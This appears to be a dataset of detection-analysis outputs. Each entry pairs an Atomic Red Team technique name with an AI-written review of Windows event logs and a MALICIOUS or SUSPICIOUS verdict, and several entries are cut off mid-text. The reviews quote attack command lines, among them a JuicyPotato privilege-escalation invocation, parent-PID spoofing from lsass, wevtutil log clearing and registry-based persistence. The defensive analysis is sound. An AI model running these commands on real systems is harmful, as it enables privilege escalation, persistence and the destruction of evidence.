   - The Security log shows an account (`admin_test`) receiving a wide array of privileges (SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.), which can be consistent with privilege escalation tactics if they were not granted legitimately as part of a controlled process.

4. **Time Synchronization Entries:**
   - The repeated time adjustments in the logs are suspicious. Unauthorized or frequent time changes can be indicative of an attacker attempting to manipulate or obfuscate event timelines.

### Assessment of the Situation:

Based on the above indicators, it appears that:
- There is suspicious activity involving PowerShell used in conjunction with potentially harmful executables from a red-teaming framework.
- The clearing of event logs (System and PowerShell) indicates an effort to hide actions, a common tactic employed in malicious activities.
- The granting of elevated privileges to the `admin_test` user, combined with the other suspicious activities, suggests unauthorized actor behavior.

### Guidance on How to Proceed:

1. **Containment:**
   - Immediately isolate the affected host (`Server002`) from the network to prevent any further potential spread or data exfiltration.
   
2. **Investigation:**
   - Conduct a full forensic analysis of the host, including memory and full disk analysis, to confirm the exact scope and nature of any compromise. Investigate any persistence mechanisms that may have been established.

3. **Remediation:**
   - Revoke any unauthorized privileges granted to users.
   - Ensure all security patches and updates are applied to prevent exploitation of known vulnerabilities.
   - Implement better monitoring and alerting around high-privilege level activities in the environment.

4. **Incident Report:**
   - Document findings, including the timeline of events, methods of detected compromise, and steps taken for remediation, for future reference and compliance needs.

**Resolution: MALICIOUS**

The activities suggested in the logs present clear indications of potential compromise, covert operation behaviors, and attempts to manipulate security mechanisms. The combination of direct execution of processes indicating red team tool usage, clearing of event logs, and suspicious privilege use lead to the determination of malicious activity."
Leverage Virtual Channels to execute custom DLL during successful RDP session,"Upon analyzing the provided logs, several indicators suggest potential malicious activity, specifically concerning the clearing of event logs and registry manipulation. Here's a breakdown of the suspicious and anomalous behavior observed:

1. **Log File Clearing:**
    - The logs indicate multiple events where log files have been cleared, including the Security, System, and Windows PowerShell logs. The user ""admin_test"" triggered these events, which could suggest an attempt to cover potentially malicious activity. Events like these (with EventID 1102 for Security log clearance) are high-risk as they erase forensic evidence.

2. **Use of `wevtutil`:**
    - The command-line utility `wevtutil.exe` is used to clear event logs, as observed in several entries. The execution of `wevtutil.exe` with commands like `cl System`, `cl Security`, and `cl ""Windows PowerShell""` strongly suggests an intentional action to delete logs, which is generally associated with malicious intent.

3. **Registry Manipulation:**
    - There is an execution of `cmd.exe` followed by `reg.exe`, indicating registry modifications that inject ""Malware"" into a known legitimate namespace (`HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default\Addins`). This is highly indicative of malicious behavior, as it involves altering the registry to potentially load a malicious library.

4. **High Privilege Processes:**
    - Many of the processes, including the command-line operations, are being executed with high integrity levels, indicating they have elevated privileges, which is necessary for actions like clearing event logs or altering the registry.

5. **Installing or Modifying Software:**
    - There are several entries related to the execution of `MicrosoftEdgeUpdate.exe` and its related processes. While some of this activity might be related to legitimate software updates, the concurrent clearing of logs and registry modifications make it suspicious in this context. It raises concerns about whether this software execution was leveraged for malicious purposes alongside other activities.

6. **Temporal Correlation:**
    - The logs show a tight temporal correlation between the clearing of event logs and the execution of potentially malicious scripts or commands. This suggests a coordinated effort to execute and then hide potentially unauthorized activities.

**Guidance and Resolution:**

Given the evidence of:
- Log file clearing operations potentially to cover tracks.
- Registry modifications pointing to possible malware installation.
- Execution of processes with high privileges.
  
This activity is classified as **MALICIOUS**. Immediate actions should be taken to secure the system, such as:
- Isolating the affected system to prevent further spread.
- Conducting a thorough forensic investigation to assess the full scope and impact.
- Reviewing user credentials and applying stricter access controls.
- Restoring the system from a known good backup, if necessary.
- Enhancing monitoring to identify and prevent future occurrences.

It's crucial to respond promptly to mitigate any further risk and to conduct a full investigation to understand the intent and capabilities of the potential attacker."
HKLM - Policy Settings Explorer Run Key,"Upon analyzing the provided Windows event logs, some activities stand out as particularly suspicious and potentially indicative of malicious behavior. Here is the breakdown of these activities:

### Suspicious Log Activity:

1. **Repeated Use of `wevtutil.exe`:**
   - **`wevtutil.exe`** is utilized multiple times to clear event logs like `System`, `Application`, `Security`, and `Windows PowerShell`. The command used for clearing logs is `""wevtutil.exe cl [LogName]""`. Such behavior is characteristic of an attempt to hide malicious activities by erasing evidence from event logs. Frequent log clearing is a strong indicator of unethical or malicious intent.

2. **Use of PowerShell for Registry Modification:**
   - A PowerShell command was used to create a new registry item under `HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run`, setting the value of `atomictest` to launch `calc.exe`. This technique can be used to establish persistence by executing a program on system startup. The use of PowerShell in conjunction with registry modification is a well-known tactic in attack vectors.

3. **Clearing of Windows PowerShell Logs:**
   - It's noted that the logs corresponding to the PowerShell actions have also been cleared. This further substantiates an attempt to cover tracks and makes it significantly suspicious. Clearing essential security and application logs is indicative of potentially malicious activity.

4. **Logging Activities Involving High Integrity Levels:**
   - The activities execute at a high integrity level (`IntegrityLevel: High`), which means the actions are performed with elevated privileges. This includes clearing event logs and executing potentially harmful scripts.

5. **Multiple Privileged Logon Sessions:**
   - The logs reveal multiple session logons and high privilege sessions (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) associated with the user `admin_test`. This can imply unauthorized access or potential misuse of high-level access to alter or delete critical logs.

### Conclusion and Resolution:

Based on observed activities, which resemble known malicious behaviors, the identified use of PowerShell scripts for registry modifications, repeated clearing of various event logs, elevated privilege usages, and attempts at hiding these actions are strongly indicative of a compromise or concerted effort at malicious activity.

**Resolution: MALICIOUS**

### Recommended Actions:

1. **Immediate Isolation:**
   - Isolate the affected host from the network to prevent potential lateral movement.

2. **Full System Audit:**
   - Conduct a comprehensive audit of the affected system to evaluate the extent of the compromise. Analyze unaffected backups if available.

3. **Investigation and Restoration:**
   - Investigate possible entry points or vulnerabilities leading to the incident. Restore system logs from backups if possible, and consider rebuilding the host from a known clean state.

4. **Review and Strengthen Security Posture:**
   - Implement enhanced logging and monitoring to detect cleared logs immediately.
   - Strengthen endpoint protection, particularly PowerShell execution controls.
   - Review and adjust user access permissions, ensuring that privileged access is strictly controlled."
Snake Malware Kernel Driver Comadmin,"Upon reviewing the provided logs, several events indicate potentially malicious activities that warrant closer investigation. Here's a detailed analysis:

1. **PowerShell Activity**: 
   - The PowerShell command executed involves creating a directory and writing random bytes to a file named ""comadmin.dat"" in the ""system32\Com"" directory. The use of PowerShell for such operations could indicate an attempt to hide or maintain persistence on the system by creating or modifying files in sensitive system directories. This activity is certainly suspicious, especially given the covert nature of writing random data to a new file in a protected directory.

2. **Log Clearing**:
   - Multiple entries in the System, Application, Windows PowerShell, and Security logs have been cleared (evidenced by events with ""wevtutil.exe"" clearing logs). The clearing of logs (`EventID: 104` in Sysmon and EventID: 1102 in Security) is an activity often associated with attackers attempting to cover their tracks on a compromised system. The events involve the ""admin_test"" user, which indicates potential misuse of an administrative account or the account itself being compromised.
  
3. **Sysmon Observations**:
   - `wevtutil.exe` commands were run to clear logs, and this action is tied to the execution by the ""admin_test"" account, which matches the user in the Security log clearing event. This correlates with log clearing attempts discussed above and strongly suggests potential log tampering by a user with administrative privileges.

4. **Windows Edge Update Activities**:
   - The repetitive execution of Microsoft Edge Update processes seems relatively benign at first glance, reflecting standard update operations. However, the rapid and frequent spawning of update-related processes might still warrant verification to ensure these activities are legitimate and not being used as a diversion or being hijacked for malicious purposes. They appear as benign components for now.

### Assessment:
The presence of PowerShell activity executing potentially suspicious operations, coupled with the clearing of multiple event logs, strongly suggests that malicious activities have occurred. These logs, coupled with abnormal system activities, are consistent with an attempt to obfuscate malicious actions.

### Threats or Risks Identified:
- Persistence and data manipulation in a critical system directory using PowerShell.
- Log clearing activities suggestive of deliberate obfuscation to prevent detection.

### Guidance on Proceeding:
- Investigate the ""admin_test"" account for unauthorized usage or profile compromise.
- Review recent changes or abnormal access patterns associated with invoking PowerShell scripts and log clearing.
- Perform a forensic analysis of the system for signs of other compromised binaries or registry persistence.
- Implement continuous monitoring to detect and alert any unauthorized PowerShell usage or log tampering in the future.

### Resolution: MALICIOUS
The combination of suspicious PowerShell activity and event log clearing strongly suggests malicious intentions and activities on the system. Immediate containment and detailed forensic analysis are recommended to determine the full extent of the compromise and mitigate ongoing risks."
Parent PID Spoofing - Spawn from Current Process,"### Detailed Analysis of Logs

The provided logs consist of entries from Windows PowerShell, System, Sysmon, Security, and Application logs. After closely examining the logs, several patterns and activities stand out which are analyzed below:

#### 1. **PowerShell Logs**
- **Event ID 600:** The PowerShell logs show entries with commands being executed to start processes under specific parent processes using a method called `Start-ATHProcessUnderSpecificParent`. The command-line argument includes `'-Command Start-Sleep 10'`, which is a typical method attackers use to delay actions as part of automated scripts or malware.
- **Assessment:** Usage of the `Start-ATHProcessUnderSpecificParent` command could indicate an attempt to obscure processes or launch them under trusted parent processes which is suspicious and commonly used in malicious activities.

#### 2. **System Logs**
- **Event ID 104:** Logs being cleared for both the System and PowerShell channels by the user `admin_test`. This is a significant sign of possible log tampering or concealment of actions, indicating malicious intent.
- **Other Updates:** There are multiple entries related to Windows updates which are standard operations and not inherently suspicious.

#### 3. **Sysmon Logs**
- **Event IDs 1 & 5:** We observe multiple wevtutil commands executed by `admin_test` for clearing event logs, which aligns with the need to conceal malicious activities. Additionally, several powershell.exe processes are executed, corresponding with the suspicious commands observed in PowerShell logs.
- **Process Anomalies:** Frequent clearing of logs and restarting PowerShell could signify attempts to hide actions.

#### 4. **Security Logs**
- **Event ID 1102:** The security logs were cleared around the same time as others, linking to the same `admin_test` user.
- **Privilege Events:** Privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others are seen granted to SYSTEM, which are sensitive and often exploited in privilege escalation attacks.

#### 5. **Application Logs**
- **Event ID 16394:** No significant malicious activity observed within the Application log entry provided.

### Summary and Risk Assessment

- **Indicators of Suspicious Activity:**
  - Execution of PowerShell commands with potentially harmful intent.
  - Consistent clearing of event logs across System, Security, and PowerShell channels.
  - Execution of commands involving high privileges that resemble privilege escalation techniques.
  
- **Indicators of Malicious Activity:**
  - Log clearance is typically an indication of attempts to remove traces of malicious or unauthorized activities.
  - The usage of `Start-ATHProcessUnderSpecificParent` is not a common benign activity.

### Conclusion
Based on the analysis, the logs present clear signs of suspicious activity warranting further investigation. The log clearing, unusual command executions in PowerShell, and activity around log tampering suggest actions aligning with tactics observed in malicious activities.

### Resolution
- **Resolution:** MALICIOUS - The activities observed in the logs strongly indicate malicious intent and actions. Immediate steps should be taken to secure the system, including:
  - Isolating the host from the network.
  - Conducting a deeper forensic analysis on the host to identify any unauthorized changes or malicious configurations.
  - Reviewing and auditing any administrative accounts, especially `admin_test`.
  - Applying necessary security patches and updates post-investigation and ensuring logging configurations are properly set to detect such behavior in the future. 

Given the findings, it is imperative to investigate further and implement strict security measures to prevent potential breaches."
Access Token Manipulation,"Based on the analysis of the provided logs, I have identified several events that are indeed suspicious and potentially indicative of malicious activity. Here are the key findings from the logs:

1. **Execution of PowerShell with a Suspicious Script**: The logs show an instance of PowerShell being used with parameters that bypass execution policies, which are often used in attempts to execute malicious scripts without user limitations or detection. This is evident from:
   - CommandLine: `""powershell.exe"" & {Set-ExecutionPolicy -Scope Process Bypass -Force, $owners = @{}, gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}, Get-Process | Select ProcessName,Id,@{l=\""Owner\"";e={$owners[$_.id.tostring()]}}, & \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1134.002\\src\\GetToken.ps1\""; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\""cmd.exe\"")}`

2. **Clearing of Event Logs**: There are multiple instances where event logs such as System, Windows PowerShell, and Security logs have been cleared. Clearing logs is a common technique attackers use to cover their tracks and this is indicated by:
   - System Cleared Log Entry.
   - Windows PowerShell Cleared Log Entry.
   - Security Cleared Log Entry.

3. **Manipulation of System Commands and Tools**: The consistent invocation of native Windows utilities (`wevtutil.exe`, `whoami.exe`, `hostname.exe`) is normally benign but can also be used for situational awareness by an attacker. In particular, `wevtutil.exe` is used here, which suggests the clearing of logs.

4. **Time Changes**: The log entries include system time changes, which while potentially benign, can also indicate attempts to manipulate log timestamps:
   - NewTime and OldTime adjustments logged by Windows Time-Service and Kernel-General.

5. **Privileged User Activity**: Activity involving the `admin_test` user is potentially problematic given their integrity level being consistently high, involvement in log clearing, and executing suspicious commands.

6. **Usage of Security Tools**: Reference to Atomic Red Team test scripts suggests either a penetration test being conducted, or an attack employing known techniques found in security frameworks.

**Resolution: SUSPICIOUS**

The combination of these identified activities corroborates a pattern that is suspicious and appears to require further investigation. While it is not an unequivocal indicator of a compromise, the activities aligned with typical malicious behavior cannot be ignored without further inquiry and validation. 

**Next Steps:**
- Investigate the origin and legitimacy of the PowerShell script and its purpose.
- Examine the context around the log-clearing entries, including corroborating system logs for other unexplained behavior during similar timeframes.
- Interview involved personnel/users like `admin_test` to ascertain their recent activities and verify access.
- Review organizational policy management and auditing policies to ensure adequate logging and monitoring.
- Implement tighter controls and monitoring on PowerShell and other scripting activities, particularly on high integrity level accounts.

Overall, these activities warrant heightened scrutiny and collaboration with IT and security teams to root out any misconfigurations or potential security incidents."
HKLM - Modify default System Shell - Winlogon Shell KEY Value,"### Analysis of the Logs:

#### **Windows PowerShell Log:**
The PowerShell logs indicate the execution of a script that makes modifications to the Windows registry, specifically targeting the `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell` registry key. The script is backing up the current value of the `Shell` registry key and appending `C:\Windows\explorer.exe` to it. This action might seem benign as it mentions a legitimate system process, `explorer.exe`. However, the altering of the `Shell` key is commonly associated with malicious activities where attackers modify this key to execute arbitrary code at user login, often for persistence mechanisms or to launch malware.

#### **Sysmon Log:**
The Sysmon logs reveal a sequence of events where `wevtutil.exe` is utilized multiple times to clear event logs (`cl` flag), which is suspicious behavior often employed by attackers to cover their tracks. The user `SERVER002\admin_test` is consistently performing these actions. Further events show PowerShell being executed with high integrity, aligning with the suspicious PowerShell script observed in the PowerShell logs.

#### **Security Log:**
The Security logs contain an `EventID 1102`, indicating that the Windows Security logs have been cleared by the user `admin_test`. This is a highly suspicious activity, indicating potential malicious behavior as clearing logs are typically attempts to erase evidence of unauthorized access.

#### **Application and System Logs:**
The Application logs show `edgeupdate` services starting and stopping, which could be part of legitimate update processes for Microsoft Edge components. The System log indicates that the event logs were cleared in the `System` channel, reinforcing the suspicion of malicious activity as observed in other logs.

### **Assessment:**
The combination of modifying the Shell registry key, clearing of event logs, and use of `wevtutil.exe` to obscure actions can be strong indicators of malicious activity, specifically highlighting an attempt at persistence and covering tracks after performing potentially unauthorized operations. These actions suggest an external or insider threat trying to maintain access and disguise their presence on the system.

### **Resolution:**
- **MALICIOUS**: The logs exhibit clear signs of malicious activity such as registry manipulation for potential persistence, event log clearing by a user account, and the misuse of system utilities to hide tracks.

### **Guidance to Proceed:**
1. **Immediate Response**: Disconnect the affected host (Server002) from the network to contain any potential further spread of compromise.
2. **Investigation**: Conduct a thorough forensic analysis on Server002 to determine the full scope and impact of the malicious actions.
3. **User Account Review**: Investigate the `admin_test` account and reset credentials to mitigate insider threat possibilities.
4. **Recovery**: Restore the system from a known good backup prior to the incident and monitor for any further suspicious activities.
5. **Implementation of Controls**: Increase monitoring and alerting on logs modification and PowerShell executions. Implement strict auditing controls on access to sensitive registry keys and critical system processes.
6. **Awareness Training**: Educate users about signs of insider threats and unauthorized actions to enhance security posture.

Consider escalating the incident for further investigation and involve legal/compliance teams to evaluate if there are data breach implications."
Parent PID Spoofing using PowerShell,"Upon careful analysis of the provided Windows event logs from a host identified as Server002, several points of interest and potential security concerns have been highlighted which require immediate attention:

1. **Event Log Clearing (Event ID 1102 in Security Log and Event ID 104 in System Log):**
   - On October 25, 2024, the logs show the security event log and system log being cleared by a user `admin_test`. Clearing of event logs can indicate an attempt to remove evidence of malicious activity. Immediate investigation is needed to understand who performed this action and why.

2. **Usage of PowerShell (Sysmon and PowerShell Log):**
   - An instance of PowerShell (Sysmon Event ID 1) was used to execute a script from the location `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1134.004\\src\\PPID-Spoof.ps1`, which is part of a known framework for testing security detection capabilities. The script was apparently used to perform a technique called Parent Process ID Spoofing (`PPID-Spoof`), potentially to disguise a malicious process as a legitimate one.

3. **Suspicious Command Line Execution:**
   - The PowerShell script executed appears to have parameters for spawning into `iexplore.exe` (Internet Explorer) and loading a DLL (`calc.dll`) using the PPID-Spoofing technique. This is indicative of suspicious activity as it attempts to bypass traditional security detection methods by masquerading malicious activities as being legitimately initiated.

4. **High Privilege Assignments (Event ID 4672 in Security Log):**
   - Observations of high privilege assignment to the `SYSTEM` account, including privileges like `SeDebugPrivilege`, which can allow debugging of processes, is consistent with actions that could be used maliciously for privilege escalation or lateral movement within the network.

5. **Misuse of Eventing Command Line Utility (`wevtutil.exe`):**
   - Frequent executions of `wevtutil.exe` for clearing logs (`cl`) from paths like Security, Application, System, and PowerShell are reflected in Sysmon logs. This tool was utilized under the `admin_test` account, reinforcing speculative malicious behavior to cover tracks.

6. **Miscellaneous Applications and Services:**
   - Various system-level activities are noted, such as routine tasks involving `MicrosoftEdgeUpdate`, `CompatTelRunner`, and `UsoClient` which appear as commonly benign. However, due to the context of the other malicious indicators, cross-reference checks should ensure they are legitimate and not exploited services.

### Conclusion:
- **Resolution:** **MALICIOUS**
  
The combination of log clearing, use of potentially malicious PowerShell scripts, privilege escalations, and misuse of legitimate tools all point towards indicative compromise activities. Immediate containment, deeper forensic analysis of the host, and cross-verification against connected systems are recommended. Evaluating the potential for unauthorized access, privilege misuse, and backdoor installation is crucial.

### Recommended Actions:
1. **Immediate Isolation** of the affected host to prevent further activity.
2. **Detailed Forensic Analysis** on the host and suspicious accounts.
3. **Examine Account Logs** for users with escalated privileges during the timeframe.
4. **Review Network Traffic** for unusual outbound connections or data exfiltration.
5. **Strengthen Monitoring** for PowerShell and sensitive administrative tools.

Take steps towards comprehensive audits of security configurations and ensure event logging policies are adhered to and intact across the network."
At.exe Scheduled task,"**Detailed Analysis:**

Upon investigating the provided event logs from various sources, the following observations are made:

1. **Security Log:**
   - **Event ID 1102 (Log Cleared):** The logs show event ID 1102 which indicates that the security log was cleared by the user ""admin_test"". This is a notable red flag, as clearing logs can be an attempt to cover tracks after malicious activity.

2. **Application Log:**
   - No significant evidence suggesting malicious activity was noticed within the application log entries.

3. **Sysmon Log:**
   - **Process Execution:** Multiple instances of ""wevtutil.exe"" with command lines for clearing various logs (e.g., ""Microsoft-Windows-Sysmon/Operational"" and ""Security""). This aligns with the security log clearing and suggests an attempt to remove logs across different channels.
   - **CMD and AT Commands:** The ""cmd.exe"" with specific command lines (""at 13:20 /interactive cmd"") is often indicative of attempts to schedule tasks to execute with escalated privileges. This could be leveraged for persistence or escalation.
   - **Suspicious Process Chain:** Several console host executions and interactions with critical Windows executables like ""whoami.exe"" and ""hostname.exe"" could indicate reconnaissance actions, establishing persistence mechanisms, or validation of user context.

4. **System Log:**
   - **Event ID 104 (Log Cleared):** Similar to the security log, the system log clearing event was detected, further indicating an attempt to eliminate trace evidence.

5. **PowerShell Log:**
   - Not available in the logs provided. However, given the context, it's essential to inspect PowerShell logs for potential malicious script execution or module use.

**Assessment:**
The consistent clearing of logs across different channels, command execution related to scheduled tasks with possible escalation intentions, and suspicious process chains collectively indicate an attempt to obfuscate and maintain unauthorized access.

**Resolution: MALICIOUS**
The evidence of security log clearance, combined with attributed suspicious activity across several logs, confirms an indicator of compromise with malicious intent.

**Guidance on How to Proceed:**
- **Immediate Incident Response:** Isolate the impacted host to prevent further activity and preserve existing logs for comprehensive backtracking.
- **Conduct a Full System Scan:** Using tools capable of detecting rootkits and advanced threats.

Juicy Potato,"### Detailed Analysis

Upon reviewing the provided logs, several indicators of suspicious and potentially malicious activities have been identified:

1. **Log File Cleared Events (System Log & Security Log)**:
   - Event ID 104 and 1102 from the System and Security logs indicate that the Windows logs, including the System, Windows PowerShell, and Security logs, were cleared by the user `admin_test`. Log file clearing is often a sign of malicious activity as attackers clear logs to erase their tracks.

2. **Suspicious Command Execution (Sysmon Log)**:
   - We see the use of the tool `JuicyPotato.exe`, executed with the `powershell.exe` and `cmd.exe` commands. The command:
     ```
     powershell.exe & {cmd /c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\JuicyPotato.exe' -l '7777' -t * -p '$env:windir\\system32\\notepad.exe' -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'}
     ```
     - **JuicyPotato** is a known privilege escalation tool that exploits Windows security tokens to escalate privileges, indicating a high probability of attempted privilege escalation by the user `admin_test`, who also has administrative privileges.

3. **Interpreted Execution Context (PowerShell Log)**:
   - The PowerShell logs confirm the execution of commands associated with `JuicyPotato.exe`, further highlighting this user's suspicious activities.

4. **Process Execution Patterns (Sysmon Log)**:
   - Various commands related to system processes (wevtutil, conhost.exe) and actions are performed by `admin_test`, typically operating with high integrity levels. Clearing event logs and executing processes with high system privileges denote potentially risky behavior.

5. **Network Anomalies**:
   - The execution of processes related to `MicrosoftEdgeUpdate.exe` occurring under `NT AUTHORITY\SYSTEM` suggests typical operations by a legitimate process, likely not related to the suspicious activity led by `admin_test`.

### Assessment of the Situation

Based on the suspicious clearing of logs, execution of `JuicyPotato.exe`, and the associated PowerShell command logs, there is clear evidence pointing towards malicious activity. The user `admin_test` executed actions indicative of attempting privilege escalation and potential data tampering or preparation for exfiltration by erasing logs.

Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"Upon detailed analysis of the provided Windows event logs, the following observations are made:

### 1. Application Log
- The application log shows normal operations such as service stops without any specific anomalies detected that pertain to immediate concerns of actions, showing benign service behavior related to Microsoft Edge updates.

### 2. Windows PowerShell Log
- The PowerShell log contains a command script executed via `powershell.exe` which attempts to:
  - Create a new directory in the temporary directory.
  - Copy `calc.exe` to this new directory.
  - Modify a registry key related to the Explorer's ""Common Startup"" paths.
- Such actions resemble a tactic often used to achieve persistence by placing an executable in the startup folder, enabling it to execute on startup, which is highly suspicious.

### 3. Security Log
- An event with ID 1102 indicates that the security log was cleared by the user `admin_test`. Log clearing is a common technique used to cover tracks after performing potentially malicious actions.
  
### 4. System Log
- Event ID 104 shows multiple logs being cleared by `admin_test`. Log clearing across multiple channels is another potential indicator of malicious behavior undertaken by admin_test.

### 5. Sysmon Log
- The Sysmon logs show the execution of `wevtutil.exe` to clear logs, with process command lines suggesting manipulation of the Event Logs. Coupled with earlier observations, this further indicates actions to cover up potential nefarious activities.
- Many logs pertain to Microsoft Edge updates. While the activities themselves seem benign in terms of software updates, the timing and combination with previous suspicious log-clearing can contribute to potential misuse context.
  
### Conclusion
The actions observed, especially the use of PowerShell to modify startup settings, along with the clearing of security and system logs, strongly suggest attempts to cover up other processes on the system which may relate to unwanted or malicious activity. The combination of these actions strongly leans toward malicious intent, considering the common techniques associated with persistence and obfuscation post-compromise.

Suspicious vbs file run from startup Folder,"Upon a detailed review of the provided logs from various sources, here are the observations and findings:

### 1. PowerShell Activity:
- The PowerShell logs indicate the execution of a script that copies a VBS file to multiple startup directories and then executes it with `cscript.exe`. Notably, the file path involves `AtomicRedTeam`, which is known for using threat simulation techniques as part of penetration testing or adversary emulation. The commands are representative of persistence techniques commonly employed by malware.

### 2. Sysmon Activity:
- The Sysmon logs reveal the execution of `wevtutil.exe` to clear event logs (Application, System, Security, and PowerShell), a practice commonly associated with malware or attackers attempting to cover tracks.
- Multiple executions of `cscript.exe` are logged running a file named `vbsstartup.vbs`, which aligns with malicious scripts intended for persistence by executing at system startup.
- `whoami.exe` and `hostname.exe` executions may suggest enumeration by an attacker.

### 3. Security Logs:
- Event ID 1102, which indicates that a user's action (SID ending in -1006) manually cleared the Security event logs. This is a critical indicator of potential malicious intent as attackers often clear logs to remove traces of unauthorized actions.

### 4. System Logs:
- Similar to Security logs, Event IDs 104 indicate the clearing of System and PowerShell logs.
  
### Findings:
- The observed activities, especially in the PowerShell commands and log-clearing actions, strongly align with adversarial behavior. The use of known threat simulation paths (AtomicRedTeam) does not reduce the risk as they are commonly used in emulation and testing, and should be verified for legitimacy.
- The combination of script execution aimed at persistence, enumeration via system commands, and log clearing are strong signs of a potential compromise.

### Threat Assessment:
- **Risk Level:** High
- **Indicators of Compromise (IoCs):** Usage of `cscript.exe` with `vbsstartup.vbs`, clearing of various event logs with `wevtutil.exe`.

### Resolution:
- **Resolution:** MALICIOUS

### Recommendations:
1. **Immediate Incident Response:** Isolate the system (Server002) from the network to prevent further spread or data exfiltration.
2. **Forensic Analysis:** Conduct a deeper forensic investigation on the host to gather more evidence and confirm the entry point and intent.

5. **User Education and Verification:** Ensure that any testing or simulation using tools like Atomic Red Team is authorized and documented. Coordinate with Red Team or security testing personnel to confirm the legitimacy of such activities."
PowerShell Modify A Scheduled Task,"After carefully analyzing the provided logs, the following findings stand out:

### Windows PowerShell Logs
1. **Persistence Mechanism**: The PowerShell logs depict the creation of a scheduled task using a series of PowerShell commands. The task, named `AtomicTaskModifed`, is configured to execute `cmd.exe` at logon with high privileges (`RunLevel Highest`) via the `BUILTIN\Administrators` group. This initial command is then modified to execute `Notepad.exe`.

2. **Potential Intent**: The deployment of scheduled tasks, especially with admin privileges, could be a persistence mechanism often used in malicious activities. The modification of this task to execute `Notepad.exe` might be a placeholder or an attempt to bypass detection by replacing a potentially malicious command with a benign one after initial execution.

### Sysmon Logs
1. **Wevtutil.exe Activity**: The logs show multiple executions of `wevtutil.exe` to clear event logs (such as Security, System, and PowerShell). Clearing logs is a known tactic used by attackers to cover their tracks.

2. **High Integrity Level**: Multiple processes are executed with a high integrity level by the user `SERVER002\admin_test`, indicating elevated privileges.

3. **PowerShell Execution**: There are entries for PowerShell execution aligning with the creation of the scheduled task seen in the PowerShell log, hinting at script-based changes in the system.

### System Logs
1. **Event Log Clearance**: System logs record the clearance of logs from PowerShell, System, and Security channels by `admin_test`. The user `admin_test` appears to be actively involved in potentially covering tracks by clearing logs, which is suspicious and indicative of potential unauthorized or malicious activity.

### Security Logs
1. **Log Manipulation**: The transparency or lack of logs in the Application section, combined with clearance events in the Security section, suggests tampering.

2. **Privilege Use**: The logs highlight the use of extensive privileges by the user `admin_test`, which includes permissions that might allow for sensitive actions on the system (e.g., SeBackupPrivilege, SeRestorePrivilege).

### Assessment
The activity captured in these logs presents multiple red flags indicating potential malicious activity:
- Creation and modification of scheduled tasks via PowerShell with admin privileges.
- Use of `wevtutil.exe` to clear logs, which is a telltale sign of an attacker’s attempt to remain undetected.
- Consistent execution of processes with elevated privileges.
- Significant log clearance events for PowerShell, System, and Security logs.

### Conclusion
**Resolution: MALICIOUS**

This assessment strongly suggests malicious activity. Immediate incident response actions are recommended, including:
- Isolating the affected host (`Server002`) to prevent further potential spread or damage.
- Conducting a thorough forensic investigation to identify the root cause and breach vector.
- Reviewing all scheduled tasks and PowerShell activity for additional suspicious scripts or commands.
- Strengthening monitoring and logging to capture any further unauthorized actions or attempts at persistence."
Suspicious jse file run from startup Folder,"In analyzing these event logs, certain patterns and events indicate suspicious activity that merit deeper investigation. Two main areas of concern are identified:

**1. Clearing of Event Logs:**
- The security event log and system event log entries show multiple instances where the Event ID 1102 (indicating the security log was cleared) and Event ID 104 (indicating other event logs were cleared) were recorded:
  - Security log: Event ID 1102 at ""2024-10-27 15:26:40.0983870"".
  - System log: Event ID 104 at ""2024-10-27 15:26:40.0207712"" and ""2024-10-27 15:26:40.2135448"".
- These logs being cleared shortly after each other and by the same user (""admin_test"") are consistent with behavior often associated with malicious activity, where an attacker attempts to cover their tracks by removing any traceable evidence within the logs.

**2. Suspicious Use of PowerShell:**
- The PowerShell logs indicate the execution of scripts and copying of files to startup directories (""jsestartup.jse"") which could be indicative of persistence mechanisms typically used by malicious actors to ensure their code executes upon system startup.
  - The CommandLine, shown multiple times in the logs, involves copying a .jse script file to startup folders and executing it using `cscript.exe`. This action is associated with the T1547.001 technique from the MITRE ATT&CK framework, which involves using Windows Script Hosts to execute startup scripts.

**3. Use of `wevtutil` to Clear Logs:**
- The Sysmon logs show the execution of the `wevtutil.exe` (Eventing Command Line Utility) that is often used to clear event logs:
  - Multiple calls with the command line `wevtutil.exe cl Security`, `wevtutil.exe cl Application`, and `wevtutil.exe cl System`, synchronizing suspiciously with the clearing events in the Security and System logs.

**Resolution:**
- **MALICIOUS**: The combination of event logs being cleared, the use of PowerShell to create and execute suspicious scripts, and use of `wevtutil` following patterns associated with system log manipulation indicates a high likelihood of malicious activity. The behavior identified is indicative of an attacker attempting persistence and anti-forensics through log clearance.

**Next Steps:**
1. Immediately conduct further forensic analysis of the system to determine if additional compromise has occurred.
2. Review logs from network security devices to ascertain if there was external communication potentially signifying data exfiltration or C2 interaction.
3. Isolate the affected system (""Server002"") from the network to prevent further propagation or data loss.
4. Conduct a thorough malware and threat hunt across other critical systems, assuming potential lateral movement.
5. Reset credentials and evaluate access logs for ""admin_test"" account to ensure account hasn’t been compromised.
6. Implement additional endpoint detection and response (EDR) monitoring to identify future abnormal activities."
Winlogon Shell Key Persistence - PowerShell,"The provided logs indicate several potentially suspicious activities:

1. **Log Clearing:**
   - The logs show that the Windows Event Logs were cleared (EventID 1102 in Security log and EventID 104 in System log) by a user account 'admin_test'. Clearing logs is a common tactic used by malicious actors to cover their tracks and erase evidence of their activities.

2. **Command Execution with PowerShell:**
   - A PowerShell script was executed (EventID 1 in Sysmon log) that changes the registry key for the shell under `HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` (the ""Shell"" value) to `explorer.exe, C:\Windows\System32\cmd.exe`. This modification can be used to execute cmd.exe along with explorer.exe upon user logon, potentially running unauthorized commands upon user login.

3. **Use of `wevtutil.exe`:**
